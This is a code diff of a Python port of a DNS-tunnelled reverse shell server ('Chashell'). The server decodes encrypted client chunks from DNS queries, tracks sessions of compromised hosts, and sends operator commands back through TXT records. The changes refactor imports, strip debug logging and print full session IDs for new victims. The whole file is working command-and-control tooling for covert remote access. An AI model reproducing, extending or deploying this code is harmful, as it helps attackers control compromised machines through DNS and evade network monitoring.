@@ -1,4 +1,4 @@
-# server.py
+# cmd/server/serv.py
 import sys
 import os
 import time
@@ -7,16 +7,15 @@ from collections import defaultdict
 from datetime import datetime
 import binascii
 
+sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../..')))
+
 from dnslib import DNSRecord, DNSHeader, RR, TXT, QTYPE
-from dnslib.server import DNSServer, BaseResolver
+from dnslib.server import DNSServer, BaseResolver, DNSLogger
 
 from lib.crypto.symetric import open_sealed
 from lib.protocol import comm_pb2
 from lib.logging import printf, println
 from cmd.server import cli
-
-
-sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../..')))
 
 # Try to import embedded config first
 try:
@@ -54,7 +53,6 @@ cli.console_buffer = {}
 cli.packet_queue = {}
 cli.sessions_map = {}
 
-
 class ClientInfo:
     """Store client session information."""
     
@@ -64,7 +62,6 @@ class ClientInfo:
         self.lock = threading.Lock()
         self.conn = {}  # {chunk_id: ConnData}
 
-
 class ConnData:
     """Store connection chunk data."""
     
@@ -73,7 +70,6 @@ class ConnData:
         self.nonce = None
         self.packets = {}  # {chunk_num: data}
 
-
 class PollTemporaryData:
     """Temporary storage for poll queries."""
     
@@ -81,10 +77,8 @@ class PollTemporaryData:
         self.lastseen = time.time()
         self.data = data
 
-
 # Global caches
 poll_cache = {}
-
 
 class ChashellResolver(BaseResolver):
     """DNS resolver for Chashell protocol."""
@@ -115,7 +109,6 @@ class ChashellResolver(BaseResolver):
             try:
                 data_packet_raw = binascii.unhexlify(data_packet)
             except (binascii.Error, ValueError) as e:
-                printf(f"Unable to decode data packet: {data_packet}\n")
                 return "-"
             
             # Check minimum packet size (24 bytes for nonce)
@@ -145,10 +138,12 @@ class ChashellResolver(BaseResolver):
             if not client_guid:
                 println("Invalid packet: empty clientGUID!")
                 return "-"
-            
+
             # Check if session exists, create if new
             if client_guid not in cli.sessions_map:
-                printf(f"New session : {client_guid}\n")
+                # <<< FORCE PRINT FULL ID WHEN A NEW CLIENT APPEARS >>>
+                print(f"\r\nNew session : {client_guid}\nchashell >>> ", end='', flush=True)
+
                 cli.sessions_map[client_guid] = ClientInfo()
                 cli.console_buffer[client_guid] = []
             
@@ -182,7 +177,6 @@ class ChashellResolver(BaseResolver):
         # Check cache for duplicate queries
         cache_key = data_packet_raw.hex()
         if cache_key in poll_cache:
-            println("Duplicated poll query received.")
             return poll_cache[cache_key].data
         
         # Check if we have data to send
@@ -202,7 +196,6 @@ class ChashellResolver(BaseResolver):
         
         # Ignore duplicates
         if chunk_id in session.conn:
-            printf(f"Ignoring duplicated Chunkstart: {chunk_id}\n")
             return
         
         # Allocate new connection data
@@ -221,7 +214,6 @@ class ChashellResolver(BaseResolver):
         
         # Ignore duplicates
         if chunk_num in connection.packets:
-            printf(f"Ignoring duplicated Chunkdata: {chunkdata}\n")
             return
         
         # Store packet
@@ -248,7 +240,6 @@ class ChashellResolver(BaseResolver):
             # Clean up connection
             del session.conn[chunk_id]
 
-
 def timeout_checker():
     """Check for timed-out sessions."""
     while True:
@@ -270,7 +261,6 @@ def timeout_checker():
             if client_guid in cli.console_buffer:
                 del cli.console_buffer[client_guid]
 
-
 def poll_cache_cleaner():
     """Clean old poll cache entries."""
     while True:
@@ -281,16 +271,15 @@ def poll_cache_cleaner():
         cache_to_remove = []
         for poll_data, cache in poll_cache.items():
             if cache.lastseen + 10 < now:
-                printf(f"Dropping cached poll query\n")
                 cache_to_remove.append(poll_data)
         
         # Remove old entries
         for poll_data in cache_to_remove:
             del poll_cache[poll_data]
 
-
 def main():
     """Main server function."""
+    
     if not TARGET_DOMAIN or not ENCRYPTION_KEY:
         print("Error: TARGET_DOMAIN and ENCRYPTION_KEY must be set")
         sys.exit(1)
@@ -301,7 +290,9 @@ def main():
     
     # Start DNS server in background thread
     resolver = ChashellResolver()
-    dns_server = DNSServer(resolver, port=53, address="0.0.0.0")
+    error_logger = DNSLogger(log="error", prefix=False)
+
+    dns_server = DNSServer(resolver, port=53, address="0.0.0.0", logger=error_logger)
     
     dns_thread = threading.Thread(target=dns_server.start, daemon=True)
     dns_thread.start()
@@ -316,7 +307,6 @@ def main():
     
     # Run CLI
     cli.run_cli()
-
 
 if __name__ == "__main__":
     main()
